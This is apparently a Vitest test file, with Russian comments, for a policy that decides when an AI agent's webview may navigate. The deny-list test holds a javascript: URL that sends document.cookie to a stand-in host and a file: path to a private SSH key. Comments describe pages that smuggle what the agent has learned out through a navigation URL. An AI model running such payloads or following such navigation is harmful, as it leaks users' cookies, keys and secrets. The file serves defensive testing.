// Задача 3E.4 (R22). Правило написано ДО возможности, значит тесты — пока
// единственное, что его держит: подключит его задача 3E.5.

import { describe, expect, it } from 'vitest'

import { decidePreviewNavigation, describeNavigation } from './preview-nav-policy'

const OPENED = 'https://docs.example.org/guide/intro'

describe('decidePreviewNavigation, граница по источнику (умолчание)', () => {
  it('переход внутри того же сайта проходит', () => {
    expect(decidePreviewNavigation(OPENED, 'https://docs.example.org/guide/next')).toEqual({
      action: 'allow'
    })
  })

  it('чужой источник спрашивает человека', () => {
    // Опасен не переход, а адрес: в него страница кладёт то, что агент узнал.
    expect(decidePreviewNavigation(OPENED, 'https://collector.example.net/?q=секрет')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })

  it('другой поддомен — другой источник', () => {
    expect(decidePreviewNavigation(OPENED, 'https://api.example.org/x')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })

  it('другая схема того же хоста — тоже другой источник', () => {
    // Спуск с https на http отдаёт адрес и содержимое любому по дороге.
    expect(decidePreviewNavigation(OPENED, 'http://docs.example.org/guide/next')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })

  it('другой порт — другой источник', () => {
    expect(decidePreviewNavigation(OPENED, 'https://docs.example.org:8443/guide')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })
})

describe('decidePreviewNavigation, что не является переходом', () => {
  it('пустая страница гостя проходит', () => {
    // Тег `webview` начинает с неё; спросить здесь значило бы спросить до того,
    // как вообще что-то открылось.
    expect(decidePreviewNavigation('', 'about:blank')).toEqual({ action: 'allow' })
    expect(decidePreviewNavigation(OPENED, 'ABOUT:BLANK')).toEqual({ action: 'allow' })
  })

  it('якорь внутри страницы переходом не считается даже в строгом режиме', () => {
    expect(decidePreviewNavigation(OPENED, `${OPENED}#section-3`, 'page')).toEqual({
      action: 'allow'
    })
  })

  it('косая черта в конце — та же страница: её дописывает сервер', () => {
    expect(decidePreviewNavigation(OPENED, `${OPENED}/`, 'page')).toEqual({ action: 'allow' })
  })
})

describe('decidePreviewNavigation, схемы вне веба', () => {
  it('javascript:, data:, file: и blob: отклоняются без вопроса', () => {
    // Ответить «да» на такое не может быть правильно, поэтому вопрос человеку
    // был бы не выбором, а перекладыванием.
    for (const target of [
      'javascript:fetch("https://x.example/"+document.cookie)',
      'data:text/html,<script>1</script>',
      'file:///C:/Users/Evgen/.ssh/id_rsa',
      'blob:https://docs.example.org/abc'
    ]) {
      expect(decidePreviewNavigation(OPENED, target)).toEqual({
        action: 'deny',
        reason: 'not-web'
      })
    }
  })

  it('мусор вместо адреса — отказ, а не пропуск', () => {
    expect(decidePreviewNavigation(OPENED, 'не адрес')).toEqual({
      action: 'deny',
      reason: 'not-web'
    })
  })
})

describe('decidePreviewNavigation, когда сравнивать не с чем', () => {
  it('ничего не открывали — спрашиваем', () => {
    // «Не знаю, откуда пришли» не то же самое, что «пришли откуда можно».
    expect(decidePreviewNavigation('', 'https://example.org/')).toEqual({
      action: 'ask',
      reason: 'nothing-opened'
    })
    expect(decidePreviewNavigation('file:///tmp/a.html', 'https://example.org/')).toEqual({
      action: 'ask',
      reason: 'nothing-opened'
    })
  })
})

describe('decidePreviewNavigation, строгость по букве SPEC', () => {
  it('другая страница того же сайта спрашивает', () => {
    expect(decidePreviewNavigation(OPENED, 'https://docs.example.org/guide/next', 'page')).toEqual({
      action: 'ask',
      reason: 'other-page'
    })
  })

  it('и это ровно та цена, из-за которой умолчание другое', () => {
    // Канонизация адреса самим сервером в строгом режиме уже вопрос.
    expect(
      decidePreviewNavigation('https://docs.example.org', 'https://docs.example.org/ru/', 'page')
    ).toEqual({ action: 'ask', reason: 'other-page' })
  })
})

describe('подъём до https', () => {
  it('тот же хост по защищённому каналу — не вопрос', () => {
    // Иначе первый же ответ сервера на введённый человеком адрес порождал
    // бы диалог, и человек привыкал бы отвечать «да» не читая.
    expect(decidePreviewNavigation('http://дом.example', 'https://дом.example')).toEqual({
      action: 'allow'
    })
  })

  it('понижение до http спрашивается: это не подъём', () => {
    expect(decidePreviewNavigation('https://дом.example', 'http://дом.example')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })

  it('чужой хост подъёмом не прикрывается', () => {
    expect(decidePreviewNavigation('http://дом.example', 'https://сборщик.example')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })

  it('порт входит в сравнение: другой порт — другой адресат', () => {
    expect(decidePreviewNavigation('http://дом.example:8080', 'https://дом.example')).toEqual({
      action: 'ask',
      reason: 'other-origin'
    })
  })
})

describe('describeNavigation', () => {
  it('хост называется отдельно: в вопросе важен он', () => {
    expect(describeNavigation('https://collector.example.net/a?b=1')).toEqual({
      host: 'collector.example.net',
      address: 'https://collector.example.net/a?b=1'
    })
  })

  it('длинный адрес обрезается — иначе хост прячется за хвостом', () => {
    // А именно в этом хвосте и уезжает то, что агент успел узнать.
    const long = `https://x.example/?q=${'a'.repeat(2000)}`
    const shown = describeNavigation(long)

    expect(shown.host).toBe('x.example')
    expect(shown.address.length).toBeLessThanOrEqual(201)
    expect(shown.address.endsWith('…')).toBe(true)
  })
})
